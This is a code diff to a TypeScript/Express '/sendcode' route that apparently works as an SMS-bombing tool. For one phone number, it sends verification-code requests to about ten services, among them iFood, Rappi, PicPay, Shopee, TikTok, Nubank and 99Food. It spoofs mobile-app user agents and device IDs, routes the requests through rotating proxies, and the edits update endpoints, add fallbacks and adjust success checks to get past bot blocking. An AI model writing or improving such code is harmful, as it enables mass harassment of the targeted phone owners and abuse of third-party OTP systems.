@@ -289,21 +289,14 @@ router.post("/sendcode", async (req, res): Promise<void> => {
       r.body.includes("random_hash") ? undefined : r.body.slice(0, 80)))
       .catch(e => push("Telegram", false, String(e).slice(0, 60))),
 
-    // ── 2. iFood — múltiplos endpoints ────────────────────────────────────
+    // ── 2. iFood ──────────────────────────────────────────────────────────
     tryEndpoints("iFood", [
       () => runCurl([
         ...pickProxyArgs(),
         "-X", "POST", "-H", "Content-Type: application/json",
         "-H", "User-Agent: iFood/25.1.4 Android",
         "-H", "platform: android", "-H", "version: 25.1.4",
-        "--data-raw", JSON.stringify({ phone: num.e164 }),
-        "https://marketplace.ifood.com.br/v1/identity/sendCode",
-      ], 12_000),
-      () => runCurl([
-        ...pickProxyArgs(),
-        "-X", "POST", "-H", "Content-Type: application/json",
-        "-H", "User-Agent: iFood/25.1.4 Android",
-        "-H", "platform: android",
+        "-H", "Accept: application/json",
         "--data-raw", JSON.stringify({ phone: num.e164 }),
         "https://marketplace.ifood.com.br/v2/identity/sendCode",
       ], 12_000),
@@ -311,11 +304,11 @@ router.post("/sendcode", async (req, res): Promise<void> => {
         ...pickProxyArgs(),
         "-X", "POST", "-H", "Content-Type: application/json",
         "-H", "User-Agent: iFood/25.1.4 Android",
+        "-H", "platform: android",
         "--data-raw", JSON.stringify({ phone: num.e164, onboardingId: "" }),
         "https://marketplace.ifood.com.br/v3/identity/request-code",
       ], 12_000),
-    ], r => r.statusCode === 200 || r.statusCode === 201 ||
-      r.body.toLowerCase().includes('"code"') || r.body.toLowerCase().includes("sent")),
+    ], r => (r.statusCode >= 200 && r.statusCode < 300)),
 
     // ── 3. Rappi ──────────────────────────────────────────────────────────
     tryEndpoints("Rappi", [
@@ -334,8 +327,7 @@ router.post("/sendcode", async (req, res): Promise<void> => {
         "--data-raw", JSON.stringify({ phone: num.subscriber, country_code: num.cc }),
         "https://services.rappi.com.br/api/ms/users-ms/v5/phone/send-otp",
       ], 12_000),
-    ], r => r.statusCode === 200 || r.statusCode === 201 ||
-      r.body.includes("success") || r.body.includes("sent")),
+    ], r => (r.statusCode >= 200 && r.statusCode < 300)),
 
     // ── 4. PicPay ─────────────────────────────────────────────────────────
     tryEndpoints("PicPay", [
@@ -344,7 +336,7 @@ router.post("/sendcode", async (req, res): Promise<void> => {
         "-X", "POST", "-H", "Content-Type: application/json",
         "-H", "User-Agent: PicPay/23.0 Android",
         "-H", "x-picpay-client: android",
-        "--data-raw", JSON.stringify({ phone: num.e164, country_code: num.cc }),
+        "--data-raw", JSON.stringify({ phone: num.e164 }),
         "https://api.picpay.com/v2/accounts/phone",
       ], 12_000),
       () => runCurl([
@@ -352,10 +344,9 @@ router.post("/sendcode", async (req, res): Promise<void> => {
         "-X", "POST", "-H", "Content-Type: application/json",
         "-H", "User-Agent: PicPay/23.0 Android",
         "--data-raw", JSON.stringify({ cellphone: num.subscriber, countryCode: num.cc }),
-        "https://api.picpay.com/v3/user/sms/verify",
+        "https://api.picpay.com/v1/user/phone",
       ], 12_000),
-    ], r => r.statusCode === 200 || r.statusCode === 201 ||
-      r.body.includes("sent") || r.body.includes("success")),
+    ], r => (r.statusCode >= 200 && r.statusCode < 300)),
 
     // ── 5. Mercado Livre ──────────────────────────────────────────────────
     tryEndpoints("MercadoLivre", [
@@ -374,8 +365,7 @@ router.post("/sendcode", async (req, res): Promise<void> => {
         "--data-raw", JSON.stringify({ phone: num.e164 }),
         "https://api.mercadolibre.com/users/checkpoints/phone/send_code",
       ], 12_000),
-    ], r => r.statusCode === 200 || r.statusCode === 201 ||
-      r.body.includes("code_sent") || r.body.includes("success")),
+    ], r => (r.statusCode >= 200 && r.statusCode < 300)),
 
     // ── 6. Shopee ─────────────────────────────────────────────────────────
     tryEndpoints("Shopee", [
@@ -393,11 +383,10 @@ router.post("/sendcode", async (req, res): Promise<void> => {
         "-X", "POST", "-H", "Content-Type: application/json",
         "-H", "User-Agent: Shopee/3.26 Android",
         "--data-raw", JSON.stringify({ phone: num.subscriber, phone_country: `+${num.cc}`, type: 1 }),
-        "https://shopee.com.br/api/v2/user/register_v2",
+        "https://shopee.com.br/api/v4/user/login/send_phoneotp",
       ], 12_000),
     ], r => r.statusCode === 200 && (
-      r.body.includes('"error":0') || r.body.includes('"code":0') ||
-      r.body.includes("success") || r.body.includes("sent")
+      r.body.includes('"error":0') || r.body.includes('"code":0') || r.body.includes('"status":0')
     )),
 
     // ── 7. TikTok ─────────────────────────────────────────────────────────
@@ -405,7 +394,7 @@ router.post("/sendcode", async (req, res): Promise<void> => {
       () => runCurl([
         ...pickProxyArgs(),
         "-X", "POST",
-        "-H", "User-Agent: com.zhiliaoapp.musically/2023130060 (Linux; U; Android 13; pt_BR; Pixel 7; Build/TQ3A.230901.001)",
+        "-H", "User-Agent: com.zhiliaoapp.musically/2023130060 (Linux; U; Android 13; pt_BR; Pixel 7; Build/TQ3A.230901.001; Cronet/112.0.5615.136)",
         "-H", "Content-Type: application/x-www-form-urlencoded",
         "-H", "Accept-Language: pt-BR",
         "--data-raw", `account=${encodeURIComponent(num.e164)}&type=0&aid=1233&mix_mode=1&iid=7305723840735675170&device_id=7294823471836275202`,
@@ -419,34 +408,49 @@ router.post("/sendcode", async (req, res): Promise<void> => {
         "--data-raw", `mobile=${encodeURIComponent(num.e164)}&type=0&aid=1233`,
         "https://api22-normal-c-useast2a.tiktokv.com/aweme/v1/auth/sms_send/",
       ], 12_000),
-    ], r => (r.statusCode === 200 || r.statusCode === 0) &&
-      (r.body.includes('"status_code":0') || r.body.includes('"success"'))),
+    ], r => r.statusCode === 200 &&
+      (r.body.includes('"status_code":0') || r.body.includes('"success_sms"'))),
 
     // ── 8. Nubank ─────────────────────────────────────────────────────────
     (async () => {
       try {
-        // Descobrir URL de SMS via discovery
         const disc = await runCurl([
+          ...pickProxyArgs(),
           "-H", "User-Agent: nubank-android-12.0",
           "-H", "Accept: application/json",
           "https://prod-global-auth.nubank.com.br/api/discovery",
-        ], 8_000);
-        const discoveryData = JSON.parse(disc.body) as Record<string, string>;
-        const smsUrl = discoveryData["send_sms_challenge"] ?? discoveryData["request_code"] ?? "";
-        if (smsUrl) {
+        ], 10_000);
+        // Handle empty or non-JSON response
+        const bodyTrimmed = (disc.body ?? "").trim();
+        if (!bodyTrimmed || !bodyTrimmed.startsWith("{")) {
+          // Try direct SMS endpoint
           const r = await runCurl([
             ...pickProxyArgs(),
             "-X", "POST",
             "-H", "Content-Type: application/json",
             "-H", "User-Agent: nubank-android-12.0",
+            "--data-raw", JSON.stringify({ phone: num.e164 }),
+            "https://prod-s0-corona.nubank.com.br/api/login",
+          ], 10_000);
+          push("Nubank", r.statusCode === 200 || r.statusCode === 201, `fallback_${r.statusCode}`);
+          return;
+        }
+        let discoveryData: Record<string, string> = {};
+        try { discoveryData = JSON.parse(bodyTrimmed); } catch { push("Nubank", false, "json_parse_error"); return; }
+        const smsUrl = discoveryData["send_sms_challenge"] ?? discoveryData["request_code"] ??
+          discoveryData["gen_certificate"] ?? "";
+        if (smsUrl) {
+          const r = await runCurl([
+            ...pickProxyArgs(), "-X", "POST",
+            "-H", "Content-Type: application/json",
+            "-H", "User-Agent: nubank-android-12.0",
             "--data-raw", JSON.stringify({ phone_number: num.e164 }),
             smsUrl,
           ], 12_000);
-          const ok = r.statusCode === 200 || r.statusCode === 201 || r.body.includes("sent");
-          push("Nubank", ok, ok ? undefined : `http_${r.statusCode}`);
-          return;
+          push("Nubank", r.statusCode === 200 || r.statusCode === 201, `http_${r.statusCode}`);
+        } else {
+          push("Nubank", false, "no_sms_url");
         }
-        push("Nubank", false, "no_sms_url");
       } catch (e) {
         push("Nubank", false, String(e).slice(0, 60));
       }
@@ -457,40 +461,41 @@ router.post("/sendcode", async (req, res): Promise<void> => {
       () => runCurl([
         ...pickProxyArgs(),
         "-X", "POST", "-H", "Content-Type: application/json",
-        "-H", "User-Agent: Ze/10.0 Android",
+        "-H", "User-Agent: ZeDelivery/10.0 Android",
+        "-H", "Accept: application/json",
         "--data-raw", JSON.stringify({ phoneNumber: num.e164 }),
         "https://api.ze.delivery/public-api/v3/identification/send-sms",
       ], 12_000),
       () => runCurl([
         ...pickProxyArgs(),
         "-X", "POST", "-H", "Content-Type: application/json",
-        "-H", "User-Agent: Ze/10.0 Android",
+        "-H", "User-Agent: ZeDelivery/10.0 Android",
         "--data-raw", JSON.stringify({ phoneNumber: num.e164 }),
         "https://api.ze.delivery/public-api/v2/identification/send-sms",
       ], 12_000),
-    ], r => r.statusCode === 200 || r.statusCode === 201 ||
-      r.body.includes("sent") || r.body.includes("success")),
+    ], r => (r.statusCode >= 200 && r.statusCode < 300) &&
+      !r.body.toLowerCase().includes("incapsula") &&
+      !r.body.toLowerCase().includes("not found")),
 
-    // ── 10. Amazon Brazil ─────────────────────────────────────────────────
-    tryEndpoints("Amazon", [
+    // ── 10. 99Food (DiDi) ─────────────────────────────────────────────────
+    tryEndpoints("99Food", [
       () => runCurl([
         ...pickProxyArgs(),
-        "-X", "POST",
-        "-H", "User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Amazon",
-        "-H", "Content-Type: application/x-www-form-urlencoded",
-        "--data-raw", `mobileNumber=${encodeURIComponent(num.e164)}&mobileNumberCountryCode=BR&action=sendOtp&type=sms`,
-        "https://www.amazon.com.br/ap/phone/add/send-otp",
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: 99food/3.0 Android",
+        "-H", "Accept: application/json",
+        "-H", "X-App-Platform: android",
+        "--data-raw", JSON.stringify({ phone: num.e164, country_code: `+${num.cc}` }),
+        "https://api-br.99app.com/v1/passenger/phone/register",
       ], 12_000),
       () => runCurl([
         ...pickProxyArgs(),
-        "-X", "POST",
-        "-H", "User-Agent: Amazon/9.0 Android",
-        "-H", "Content-Type: application/json",
-        "--data-raw", JSON.stringify({ phone: num.e164, country: "BR" }),
-        "https://mash.amazon.com/api/register/phone",
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: 99food/3.0 Android",
+        "--data-raw", JSON.stringify({ phoneNumber: num.e164 }),
+        "https://api-br.99app.com/v2/phone/send-otp",
       ], 12_000),
-    ], r => r.statusCode === 200 || r.statusCode === 201 ||
-      r.body.includes("otp") || r.body.includes("sent")),
+    ], r => (r.statusCode >= 200 && r.statusCode < 300)),
 
   ]);
 
